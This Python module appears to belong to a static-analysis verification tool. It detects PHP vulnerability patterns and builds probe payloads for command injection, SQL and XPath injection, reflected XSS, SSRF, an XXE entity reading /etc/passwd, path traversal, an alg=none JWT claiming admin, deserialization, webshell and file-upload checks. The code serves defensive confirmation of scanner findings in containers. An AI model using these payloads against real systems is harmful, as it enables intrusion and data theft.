"""
PHP-specific D2 deterministic strategy helpers.
"""
import logging
import re
from pathlib import Path
from typing import Dict, Optional

from .d2_types import VerificationResult

logger = logging.getLogger(__name__)


class D2PhpStrategiesMixin:
    def _detect_php_command_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        for php_file in self._find_target_files(project_path, vulnerability, [".php"]):
            content = php_file.read_text(encoding="utf-8", errors="ignore")
            param_info = self._extract_php_superglobal_name(content, ["GET", "REQUEST", "POST"])
            if not param_info.get("name"):
                continue
            return {
                "exploit_family": "php_command_exec",
                "image": self._select_project_image(project_path, "sast-target:latest"),
                "container_port": str(self._guess_node_container_port(self._select_project_image(project_path, "sast-target:latest"))),
                "target_path": self._php_route_from_file(project_path, php_file),
                "parameter": param_info["name"],
                "method": "GET" if param_info["source"] in ("get", "request") else "POST",
                "payload": "id",
                "expected": "uid=",
                "source_file": str(php_file.relative_to(project_path)).replace("/", "\\"),
                "source_line": str(vulnerability.get("line", 0) or 0),
            }
        return None

    def _detect_php_sqli_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        for php_file in self._find_target_files(project_path, vulnerability, [".php"]):
            content = php_file.read_text(encoding="utf-8", errors="ignore")
            if not re.search(r'(mysqli_query|->query|PDO\s*\(|->prepare)', content):
                continue
            param_info = self._extract_php_superglobal_name(content, ["GET", "POST", "REQUEST"])
            if not param_info.get("name"):
                continue
            return {
                "exploit_family": "php_sqli",
                "image": self._select_project_image(project_path, "sast-target:latest"),
                "container_port": str(self._guess_node_container_port(self._select_project_image(project_path, "sast-target:latest"))),
                "target_path": self._php_route_from_file(project_path, php_file),
                "parameter": param_info["name"],
                "method": "POST" if param_info["source"] == "post" else "GET",
                "baseline": "1",
                "payload": "' OR '1'='1",
                "expected": "",
                "source_file": str(php_file.relative_to(project_path)).replace("/", "\\"),
                "source_line": str(vulnerability.get("line", 0) or 0),
            }
        return None

    def _detect_php_xss_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        for php_file in self._find_target_files(project_path, vulnerability, [".php"]):
            content = php_file.read_text(encoding="utf-8", errors="ignore")
            if not re.search(r'(echo|print)\s+.*\$_(GET|POST|REQUEST)', content):
                continue
            param_info = self._extract_php_superglobal_name(content, ["GET", "POST", "REQUEST"])
            if not param_info.get("name"):
                continue
            return {
                "exploit_family": "php_reflected_xss",
                "image": self._select_project_image(project_path, "sast-target:latest"),
                "container_port": str(self._guess_node_container_port(self._select_project_image(project_path, "sast-target:latest"))),
                "target_path": self._php_route_from_file(project_path, php_file),
                "parameter": param_info["name"],
                "method": "POST" if param_info["source"] == "post" else "GET",
                "payload": "<svg/onload=alert(1)>",
                "expected": "<svg/onload=alert(1)>",
                "source_file": str(php_file.relative_to(project_path)).replace("/", "\\"),
                "source_line": str(vulnerability.get("line", 0) or 0),
            }
        return None

    def _detect_php_open_redirect_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        for php_file in self._find_target_files(project_path, vulnerability, [".php"]):
            content = php_file.read_text(encoding="utf-8", errors="ignore")
            if not re.search(r'header\s*\(\s*[\'"]Location:|redirect\s*\(', content):
                continue
            param_info = self._extract_php_superglobal_name(content, ["GET", "POST", "REQUEST"])
            target_path = self._php_route_from_file(project_path, php_file)
            method = "POST" if param_info.get("source") == "post" else "GET"
            semantics = self._infer_business_semantics(
                "php_open_redirect",
                target_path=target_path,
                parameter=param_info.get("name") or "next",
                method=method,
                source_file=str(php_file.relative_to(project_path)).replace("/", "\\"),
                line_context=content[:800],
            )
            return {
                "exploit_family": "php_open_redirect",
                "image": self._select_project_image(project_path, "sast-target:latest"),
                "container_port": str(self._guess_node_container_port(self._select_project_image(project_path, "sast-target:latest"))),
                "target_path": target_path,
                "parameter": param_info.get("name") or "next",
                "method": method,
                "payload": "https://example.com/a3",
                "expected": "https://example.com/a3",
                "source_file": str(php_file.relative_to(project_path)).replace("/", "\\"),
                "source_line": str(vulnerability.get("line", 0) or 0),
                **semantics,
            }
        return None

    def _detect_php_ssrf_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        for php_file in self._find_target_files(project_path, vulnerability, [".php"]):
            content = php_file.read_text(encoding="utf-8", errors="ignore")
            if not re.search(r'curl_exec|curl_setopt\s*\([^,\n]+,\s*CURLOPT_URL|file_get_contents\s*\(|fopen\s*\(|fsockopen\s*\(', content, re.IGNORECASE):
                continue
            param_info = self._extract_php_superglobal_name(content, ["GET", "POST", "REQUEST"])
            if not param_info.get("name"):
                continue
            target_path = self._php_route_from_file(project_path, php_file)
            method = "POST" if param_info["source"] == "post" else "GET"
            semantics = self._infer_business_semantics(
                "php_ssrf",
                target_path=target_path,
                parameter=param_info["name"],
                method=method,
                source_file=str(php_file.relative_to(project_path)).replace("/", "\\"),
                line_context=content[:800],
            )
            return {
                "exploit_family": "php_ssrf",
                "image": self._select_project_image(project_path, "sast-target:latest"),
                "container_port": str(self._guess_node_container_port(self._select_project_image(project_path, "sast-target:latest"))),
                "target_path": target_path,
                "parameter": param_info["name"],
                "method": method,
                "payload": "http://127.0.0.1:80",
                "expected": "",
                "source_file": str(php_file.relative_to(project_path)).replace("/", "\\"),
                "source_line": str(vulnerability.get("line", 0) or 0),
                **semantics,
            }
        return None

    def _detect_php_xxe_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        for php_file in self._find_target_files(project_path, vulnerability, [".php"]):
            content = php_file.read_text(encoding="utf-8", errors="ignore")
            if not re.search(r'(simplexml_load_string|DOMDocument|loadXML|XMLReader|xml_parser_create)', content):
                continue
            param_info = self._extract_php_superglobal_name(content, ["POST", "REQUEST", "GET"])
            transport = "param"
            if "php://input" in content:
                transport = "body"
            return {
                "exploit_family": "php_xxe",
                "image": self._select_project_image(project_path, "sast-target:latest"),
                "container_port": str(self._guess_node_container_port(self._select_project_image(project_path, "sast-target:latest"))),
                "target_path": self._php_route_from_file(project_path, php_file),
                "parameter": param_info.get("name") or "xml",
                "method": "POST" if transport == "body" or param_info.get("source") == "post" else "GET",
                "transport": transport,
                "payload": '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                "expected": "root:",
                "source_file": str(php_file.relative_to(project_path)).replace("/", "\\"),
                "source_line": str(vulnerability.get("line", 0) or 0),
            }
        return None

    def _detect_php_xpath_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        for php_file in self._find_target_files(project_path, vulnerability, [".php"]):
            content = php_file.read_text(encoding="utf-8", errors="ignore")
            if not re.search(r'(DOMXPath|xpath\(|evaluate\()', content):
                continue
            param_info = self._extract_php_superglobal_name(content, ["GET", "POST", "REQUEST"])
            return {
                "exploit_family": "php_xpath",
                "image": self._select_project_image(project_path, "sast-target:latest"),
                "container_port": str(self._guess_node_container_port(self._select_project_image(project_path, "sast-target:latest"))),
                "target_path": self._php_route_from_file(project_path, php_file),
                "parameter": param_info.get("name") or "name",
                "method": "POST" if param_info.get("source") == "post" else "GET",
                "transport": "param",
                "baseline": "guest",
                "payload": "' or '1'='1",
                "expected": "",
                "source_file": str(php_file.relative_to(project_path)).replace("/", "\\"),
                "source_line": str(vulnerability.get("line", 0) or 0),
            }
        return None

    def _detect_php_jwt_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        for php_file in self._find_target_files(project_path, vulnerability, [".php"]):
            content = php_file.read_text(encoding="utf-8", errors="ignore")
            if not re.search(r'JWT::decode|firebase\\JWT|JWT::encode', content):
                continue
            param_info = self._extract_php_superglobal_name(content, ["GET", "POST", "REQUEST"])
            return {
                "exploit_family": "php_jwt",
                "image": self._select_project_image(project_path, "sast-target:latest"),
                "container_port": str(self._guess_node_container_port(self._select_project_image(project_path, "sast-target:latest"))),
                "target_path": self._php_route_from_file(project_path, php_file),
                "parameter": param_info.get("name") or "token",
                "method": "POST" if param_info.get("source") == "post" else "GET",
                "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4iLCJhMyI6IjQ5In0.",
                "expected": "admin",
                "source_file": str(php_file.relative_to(project_path)).replace("/", "\\"),
                "source_line": str(vulnerability.get("line", 0) or 0),
            }
        return None

    def _detect_php_deserialization_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        for php_file in self._find_target_files(project_path, vulnerability, [".php"]):
            content = php_file.read_text(encoding="utf-8", errors="ignore")
            if not re.search(r'unserialize\s*\(|yaml_parse\s*\(', content):
                continue
            param_info = self._extract_php_superglobal_name(content, ["POST", "REQUEST", "GET"])
            if not param_info.get("name"):
                continue
            target_path = self._php_route_from_file(project_path, php_file)
            method = "POST" if param_info["source"] == "post" else "GET"
            semantics = self._infer_business_semantics(
                "php_deserialization",
                target_path=target_path,
                parameter=param_info["name"],
                method=method,
                source_file=str(php_file.relative_to(project_path)).replace("/", "\\"),
                line_context=content[:800],
            )
            return {
                "exploit_family": "php_deserialization",
                "image": self._select_project_image(project_path, "sast-target:latest"),
                "container_port": str(self._guess_node_container_port(self._select_project_image(project_path, "sast-target:latest"))),
                "target_path": target_path,
                "parameter": param_info["name"],
                "method": method,
                "payload": 'a:1:{s:2:"a3";s:2:"49";}',
                "expected": "49",
                "source_file": str(php_file.relative_to(project_path)).replace("/", "\\"),
                "source_line": str(vulnerability.get("line", 0) or 0),
                **semantics,
            }
        return None

    def _detect_php_path_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        for php_file in self._find_target_files(project_path, vulnerability, [".php"]):
            content = php_file.read_text(encoding="utf-8", errors="ignore")
            if not re.search(r'(include|require|readfile|file_get_contents|unlink|rmdir)\s*\(', content):
                continue
            param_info = self._extract_php_superglobal_name(content, ["GET", "REQUEST", "POST"])
            if not param_info.get("name"):
                continue
            return {
                "exploit_family": "php_path_traversal",
                "image": self._select_project_image(project_path, "sast-target:latest"),
                "container_port": str(self._guess_node_container_port(self._select_project_image(project_path, "sast-target:latest"))),
                "target_path": self._php_route_from_file(project_path, php_file),
                "parameter": param_info["name"],
                "method": "GET" if param_info["source"] in ("get", "request") else "POST",
                "payload": "../../../../etc/passwd",
                "expected": "root:",
                "source_file": str(php_file.relative_to(project_path)).replace("/", "\\"),
                "source_line": str(vulnerability.get("line", 0) or 0),
            }
        return None

    def _detect_php_webshell_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        for php_file in self._find_target_files(project_path, vulnerability, [".php"]):
            content = php_file.read_text(encoding="utf-8", errors="ignore")
            param_info = self._extract_php_superglobal_name(content, ["POST", "GET", "REQUEST"])
            if not param_info.get("name"):
                continue
            return {
                "exploit_family": "php_webshell",
                "image": self._select_project_image(project_path, "sast-target:latest"),
                "container_port": str(self._guess_node_container_port(self._select_project_image(project_path, "sast-target:latest"))),
                "target_path": self._php_route_from_file(project_path, php_file),
                "parameter": param_info["name"],
                "method": "POST" if param_info["source"] == "post" else "GET",
                "payload": "echo 49;",
                "expected": "49",
                "source_file": str(php_file.relative_to(project_path)).replace("/", "\\"),
                "source_line": str(vulnerability.get("line", 0) or 0),
            }
        return None

    def _detect_php_file_upload_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        for php_file in self._find_target_files(project_path, vulnerability, [".php"]):
            content = php_file.read_text(encoding="utf-8", errors="ignore")
            param_info = self._extract_php_superglobal_name(content, ["FILES"])
            return {
                "exploit_family": "php_file_upload",
                "image": self._select_project_image(project_path, "sast-target:latest"),
                "container_port": str(self._guess_node_container_port(self._select_project_image(project_path, "sast-target:latest"))),
                "target_path": self._php_route_from_file(project_path, php_file),
                "field_name": param_info.get("name") or "file",
                "filename": "a3-test.php",
                "content": "<?php echo 49; ?>",
                "expected": "upload",
                "source_file": str(php_file.relative_to(project_path)).replace("/", "\\"),
                "source_line": str(vulnerability.get("line", 0) or 0),
            }
        return None

    def _verify_php_command_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="php_command_exec_probe.py",
            poc_type="php-command-exec",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "cmd"),
                "--method", strategy.get("method", "GET"),
                "--payload", strategy.get("payload", "id"),
                "--expected", strategy.get("expected", "uid="),
            ],
            success_reason="已通过 PHP 命令执行探测脚本观察到系统命令回显",
            fail_reason="PHP 命令执行探测已执行，但未观察到预期命令回显",
            fix_suggestion="禁止将请求参数传入 system/exec/shell_exec/passthru/popen",
        )

    def _verify_php_sqli_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="generic_sqli_probe.py",
            poc_type="php-sqli",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "id"),
                "--method", strategy.get("method", "GET"),
                "--baseline", strategy.get("baseline", "1"),
                "--payload", strategy.get("payload", "' OR '1'='1"),
                "--expected", strategy.get("expected", ""),
            ],
            success_reason="PHP SQL injection probe observed a meaningful difference between baseline and injected responses",
            fail_reason="PHP SQL injection probe ran but did not confirm injection success",
            fix_suggestion="Use prepared statements and bind parameters instead of concatenating request data into SQL",
        )

    def _verify_php_xss_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="reflected_xss_probe.py",
            poc_type="php-reflected-xss",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "q"),
                "--method", strategy.get("method", "GET"),
                "--payload", strategy.get("payload", "<svg/onload=alert(1)>"),
            ],
            success_reason="PHP reflected XSS probe observed unescaped attacker-controlled markup in the response",
            fail_reason="PHP reflected XSS probe ran but did not confirm unescaped payload reflection",
            fix_suggestion="Escape output with context-appropriate encoding and avoid echoing raw request values into HTML",
        )

    def _verify_php_open_redirect_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="node_open_redirect_probe.py",
            poc_type="php-open-redirect",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "next"),
                "--method", strategy.get("method", "GET"),
                "--payload", strategy.get("payload", "https://example.com/a3"),
                "--expected", strategy.get("expected", "https://example.com/a3"),
            ],
            success_reason="PHP open redirect probe observed attacker-controlled redirect targets",
            fail_reason="PHP open redirect probe ran but did not confirm redirect target control",
            fix_suggestion="Restrict redirect targets to fixed internal paths or allowlisted domains before sending Location headers",
        )

    def _verify_php_ssrf_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="node_ssrf_probe.py",
            poc_type="php-ssrf",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "url"),
                "--method", strategy.get("method", "GET"),
                "--payload", strategy.get("payload", "http://127.0.0.1:80"),
                "--expected", strategy.get("expected", ""),
            ],
            success_reason="PHP SSRF probe observed server-side fetching behavior with a request-controlled URL",
            fail_reason="PHP SSRF probe ran but did not confirm a server-side fetch to the supplied URL",
            fix_suggestion="Reject arbitrary outbound URLs, normalize and allowlist destinations, and avoid passing request-controlled URLs to curl/file_get_contents directly",
        )

    def _verify_php_jwt_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="php_jwt_probe.py",
            poc_type="php-jwt",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "token"),
                "--method", strategy.get("method", "GET"),
                "--payload", strategy.get("payload", "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4iLCJhMyI6IjQ5In0."),
                "--expected", strategy.get("expected", "admin"),
            ],
            success_reason="PHP JWT 探测脚本已观察到弱 JWT 被服务端接受",
            fail_reason="PHP JWT 探测已执行，但未观察到预期 JWT 绕过结果",
            fix_suggestion="禁止接受 alg=none 或关闭签名校验，显式限制允许算法并校验签名与关键声明",
        )

    def _verify_php_xxe_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="generic_xml_probe.py",
            poc_type="php-xxe",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--method", strategy.get("method", "POST"),
                "--transport", strategy.get("transport", "body"),
                "--parameter", strategy.get("parameter", "xml"),
                "--payload", strategy.get("payload", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'),
                "--expected", strategy.get("expected", "root:"),
            ],
            success_reason="PHP XXE probe observed XML entity expansion or sensitive file disclosure",
            fail_reason="PHP XXE probe ran but did not confirm external entity expansion",
            fix_suggestion="Disable external entity loading and DTD handling in DOMDocument / SimpleXML / XMLReader before parsing untrusted XML",
        )

    def _verify_php_xpath_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="generic_xpath_probe.py",
            poc_type="php-xpath",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "name"),
                "--method", strategy.get("method", "GET"),
                "--transport", strategy.get("transport", "param"),
                "--baseline", strategy.get("baseline", "guest"),
                "--payload", strategy.get("payload", "' or '1'='1"),
                "--expected", strategy.get("expected", ""),
            ],
            success_reason="PHP XPath probe observed a meaningful difference between baseline and injected responses",
            fail_reason="PHP XPath probe ran but did not confirm XPath injection success",
            fix_suggestion="Do not splice request data into DOMXPath expressions; use strict allowlists and fixed XPath templates",
        )

    def _verify_php_deserialization_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="php_deserialization_probe.py",
            poc_type="php-deserialization",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "data"),
                "--method", strategy.get("method", "POST"),
                "--payload", strategy.get("payload", 'a:1:{s:2:"a3";s:2:"49";}'),
                "--expected", strategy.get("expected", "49"),
            ],
            success_reason="PHP 反序列化探测脚本已观察到危险输入被服务端解析",
            fail_reason="PHP 反序列化探测已执行，但未观察到预期解析结果",
            fix_suggestion="禁止将 HTTP 输入直接交给 unserialize/yaml_parse，并加上类型和完整性限制",
        )

    def _verify_php_path_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="php_path_probe.py",
            poc_type="php-path-traversal",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "file"),
                "--method", strategy.get("method", "GET"),
                "--payload", strategy.get("payload", "../../../../etc/passwd"),
                "--expected", strategy.get("expected", "root:"),
            ],
            success_reason="PHP 路径穿越探测脚本已观察到敏感文件访问或文件操作生效",
            fail_reason="PHP 路径穿越探测已执行，但未观察到预期文件访问结果",
            fix_suggestion="对文件路径使用 realpath/basename 和基准目录白名单，禁止用户可控路径直接进入文件操作函数",
        )

    def _verify_php_webshell_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="php_webshell_probe.py",
            poc_type="php-webshell",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "x"),
                "--method", strategy.get("method", "POST"),
                "--payload", strategy.get("payload", "echo 49;"),
                "--expected", strategy.get("expected", "49"),
            ],
            success_reason="已通过 PHP webshell 探测脚本观察到动态代码执行结果",
            fail_reason="PHP webshell 探测已执行，但未观察到预期执行结果",
            fix_suggestion="删除可疑后门文件，禁止 eval/assert 动态执行不可信输入",
        )

    def _verify_php_file_upload_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="php_file_upload_probe.py",
            poc_type="php-file-upload",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--field-name", strategy.get("field_name", "file"),
                "--filename", strategy.get("filename", "a3-test.php"),
                "--content", strategy.get("content", "<?php echo 49; ?>"),
                "--expected", strategy.get("expected", "upload"),
            ],
            success_reason="已通过 PHP 文件上传探测脚本观察到上传请求被服务端接收",
            fail_reason="PHP 文件上传探测已执行，但未观察到预期上传结果",
            fix_suggestion="限制上传目录、类型和扩展名，禁止上传可执行脚本并避免使用原始文件名落地",
        )


